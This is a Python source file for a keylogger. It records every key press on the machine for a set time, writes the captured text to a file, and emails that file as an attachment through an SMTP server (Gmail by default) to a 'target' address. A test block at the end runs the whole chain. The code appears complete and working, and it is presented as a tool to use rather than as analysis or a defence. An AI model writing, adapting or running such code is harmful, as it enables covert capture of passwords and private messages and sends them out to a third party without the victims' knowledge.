# App description:
# App that detects keystrokes on the keyboard.
# the app creates a document with all the keystrokes detected
# along with the time of the stroke
# the app also delivers the document to a target (email)

import keyboard
import os
import smtplib
import ssl
import time
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from datetime import datetime
from keys import keys


class Logger:
    """
    This class detects keystrokes.
    :param: time: it is set by default on 10min
    :returns: instances from this class return a string
    """

    def __init__(self, timer=10):
        self.timer = timer

    def get_keys(self) -> str:
        date = datetime.today().strftime("%d-%m-%Y %H:%M")
        timer = self.timer * 60 + time.time()
        ignored = list(keyboard.all_modifiers) + keys
        string = ""

        while timer > time.time():
            keystroke = keyboard.read_event()

            if keystroke.event_type == keyboard.KEY_DOWN and keystroke.name not in ignored:
                if keystroke.name == "backspace":
                    string = string[0:-1]
                elif keystroke.name == "enter" or keystroke.name == "tab":
                    string += "\n"
                else:
                    string += keystroke.name if keystroke.name != "space" else " "

        string += f" {date}"
        return string


class Document:
    """
    Document takes a string from a Capture instance object
    and converts it in a file txt. It has two parameters.
    :param: keystroke: it's a string
    :param: filename: name of the file is by default set to "document"
    :returns: instances from this class return a filepath and generate a document.txt
    """

    def __init__(self, keystrokes: str, filename="document"):
        self.keystrokes = keystrokes
        self.filename = filename

    def generate(self):
        os.getcwd()
        with open(f"{self.filename}.txt", "w") as document:
            document.write(self.keystrokes)

        return f"{self.filename}.txt"


class FileShare:
    """
    FileSharer uses smtp and MIME module to send the file.
    This class has four required parameters and one of them is set by default
    :param: file: it is a document.txt
    :param: user: your email
    :param: password: your password
    :param: target: email to send the file to
    :param: provider: it's set by default on smtp.gmail.com
    """

    def __init__(self, file, password: str, user: str, target: str, provider="smtp.gmail.com"):
        self.file = file
        self.password = password
        self.user = user
        self.target = target
        self.provider = provider

    def share(self):
        msg = MIMEMultipart()
        msg['To'], msg['From'], msg['Subject'] = self.target, self.user, "Logger"
        attachment = MIMEBase('application', 'octet-stream')
        file_to_send = self.file
        attachment.set_payload(open(file_to_send, 'rb').read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file_to_send))
        msg.attach(attachment)

        with smtplib.SMTP(self.provider) as connection:
            connection.starttls(context=ssl.create_default_context())
            connection.login(user=self.user, password=self.password)
            connection.send_message(msg)


# TEST
detected_keys = Logger(timer=5).get_keys()
doc = Document(detected_keys).generate()
file = FileShare(file=doc, password="", user="", target="")
file.share()
